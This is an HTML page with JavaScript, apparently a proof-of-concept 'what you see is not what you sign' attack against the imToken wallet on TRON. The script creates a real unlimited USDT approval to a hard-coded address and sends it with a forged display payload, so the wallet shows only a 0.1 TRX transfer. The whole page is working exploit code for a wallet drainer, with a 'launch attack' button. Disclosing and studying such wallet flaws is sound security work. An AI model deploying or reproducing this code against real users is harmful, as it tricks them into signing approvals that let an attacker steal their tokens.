<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>所见非所签 - TRX 转账实际 USDT 无限授权</title>
    <style>
        body { background: #0b0f14; color: #e1e6ed; font-family: monospace; padding: 16px; }
        button { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 10px; font-size: 15px; font-weight: bold; cursor: pointer; }
        .btn-connect { background: #2ecc71; color: #000; }
        .btn-attack { background: #e64343; color: #fff; }
        .btn-check { background: #4d94ff; color: #fff; }
        .card { background: #131a22; border: 1px solid #253040; border-radius: 12px; padding: 18px; margin-bottom: 14px; }
        pre { background: #090d13; padding: 12px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
        .log { color: #aab5c0; }
        .success { color: #2ecc71; }
        .error { color: #f04343; }
    </style>
</head>
<body>
    <h2>🔓 所见非所签攻击（TRX 演示版）</h2>
    <div class="card">
        <p>钱包确认页将显示：<br><strong>向 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz 转账 0.1 TRX</strong></p>
        <p>实际链上执行：<br><strong>仅对该地址进行 USDT 无限额度授权（无 TRX 转出）</strong></p>
        <p id="addrDisplay">未连接</p>
        <button class="btn-connect" id="btnConnect">🔗 连接 imToken</button>
        <button class="btn-attack" id="btnAttack" disabled>💣 发起攻击</button>
        <button class="btn-check" id="btnCheck" disabled>📊 查询授权额度</button>
    </div>
    <div class="card" id="logBox"><pre id="logPre" class="log">[日志] 等待操作...</pre></div>
    <script>
        const TARGET = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // 2^256-1

        let walletAddr = '';
        let tronWeb = null;

        function log(msg, cls = '') {
            const pre = document.getElementById('logPre');
            pre.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
            pre.scrollTop = pre.scrollHeight;
        }

        // 连接钱包
        async function connect() {
            if (!window.imToken?.callPromisifyAPI) {
                log('❌ 请在 imToken DApp 浏览器中打开', 'error');
                return;
            }
            for (let i = 0; i < 10; i++) {
                if (window.tronWeb?.ready) break;
                await new Promise(r => setTimeout(r, 500));
            }
            if (window.tronWeb?.ready) {
                tronWeb = window.tronWeb;
                walletAddr = tronWeb.defaultAddress.base58;
            } else {
                try {
                    const acc = await window.imToken.callPromisifyAPI('tron_requestAccounts');
                    walletAddr = Array.isArray(acc) && acc.length ? acc[0] : acc;
                } catch (e) {
                    log('获取地址失败：' + e.message, 'error');
                    return;
                }
            }
            if (!walletAddr) {
                log('❌ 未获取到钱包地址', 'error');
                return;
            }
            document.getElementById('addrDisplay').textContent = '钱包：' + walletAddr;
            document.getElementById('btnAttack').disabled = false;
            document.getElementById('btnCheck').disabled = false;
            log('✅ 已连接 ' + walletAddr, 'success');
        }

        // 查询 USDT 授权额度
        async function checkAllowance() {
            if (!walletAddr || !tronWeb) return;
            try {
                const contractHex = tronWeb.address.toHex(USDT_CONTRACT);
                const ownerHex = tronWeb.address.toHex(walletAddr);
                const { constant_result } = await tronWeb.transactionBuilder.triggerConstantContract(
                    contractHex, 'allowance(address,address)', {},
                    [{ type: 'address', value: walletAddr }, { type: 'address', value: TARGET }],
                    ownerHex
                );
                const hex = constant_result?.[0];
                if (!hex) { log('授权额度查询失败', 'error'); return; }
                const big = BigInt('0x' + hex);
                if (big === 0n) {
                    log('✅ 当前授权额度：0 USDT（未授权）', 'success');
                } else {
                    log(`⚠️ 授权额度：${big} (已授权!)`, 'error');
                }
            } catch (e) {
                log('查询失败：' + e.message, 'error');
            }
        }

        // 执行攻击
        async function executeAttack() {
            if (!walletAddr || !tronWeb) return;
            log('⚙️ 构造交易...', 'log');

            try {
                const userHex = tronWeb.address.toHex(walletAddr);
                const contractHex = tronWeb.address.toHex(USDT_CONTRACT);
                const targetHex = tronWeb.address.toHex(TARGET);

                // 1. 生成真实的 USDT approve 交易（包含 raw_data_hex）
                const tx2Resp = await tronWeb.transactionBuilder.triggerSmartContract(
                    contractHex, 'approve(address,uint256)',
                    { feeLimit: 100_000_000, callValue: 0 },
                    [{ type: 'address', value: TARGET }, { type: 'uint256', value: APPROVE_AMOUNT }],
                    userHex
                );
                if (!tx2Resp?.result?.result) {
                    log('❌ approve 构造失败', 'error');
                    return;
                }
                const approveTx = tx2Resp.transaction;
                const realHex = approveTx.raw_data_hex;
                if (!realHex) {
                    log('❌ 未能获取 raw_data_hex（tronWeb 版本不兼容）', 'error');
                    return;
                }
                log('🔐 真实授权交易 raw_data_hex 已生成', 'success');

                // 2. 伪造 raw_data（仅用于钱包展示）
                const fakeRawData = {
                    contract: [
                        {
                            type_url: 'type.googleapis.com/protocol.TransferContract',
                            parameter: {
                                type_url: 'type.googleapis.com/protocol.TransferContract',
                                value: {
                                    amount: 100000,          // 0.1 TRX
                                    owner_address: userHex,
                                    to_address: targetHex
                                }
                            }
                        }
                    ],
                    // 从真实交易中复制区块信息，确保签名时兼容
                    ref_block_bytes: approveTx.raw_data.ref_block_bytes,
                    ref_block_hash: approveTx.raw_data.ref_block_hash,
                    expiration: approveTx.raw_data.expiration,
                    timestamp: approveTx.raw_data.timestamp,
                    fee_limit: approveTx.raw_data.fee_limit
                };
                log('🎭 假 raw_data 伪造完毕（仅含 TransferContract）', 'log');

                // 3. 调用 imToken API
                const payload = {
                    tx: {
                        raw_data: fakeRawData,
                        raw_data_hex: realHex
                    },
                    from: walletAddr,
                    useTronHeader: true
                };
                log('📡 发送 tron.sendTransaction ...', 'log');
                const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', payload);

                log('✅ 交易已提交！返回：' + JSON.stringify(result), 'success');
                log('📋 请注意：钱包确认页应显示为转账 0.1 TRX', 'log');
                log('⚠️ 实际链上执行的是 USDT 无限授权，请等待约 12 秒后查询额度变化。', 'log');
                setTimeout(checkAllowance, 12000);

            } catch (e) {
                log('❌ 攻击失败：' + (e.message || JSON.stringify(e)), 'error');
                console.error(e);
            }
        }

        document.getElementById('btnConnect').addEventListener('click', connect);
        document.getElementById('btnAttack').addEventListener('click', executeAttack);
        document.getElementById('btnCheck').addEventListener('click', checkAllowance);

        if (window.imToken?.callPromisifyAPI) log('🔌 imToken 桥接已就绪', 'success');
        else log('⚠️ 请在 imToken DApp 浏览器中打开本页', 'log');
    </script>
</body>
</html>
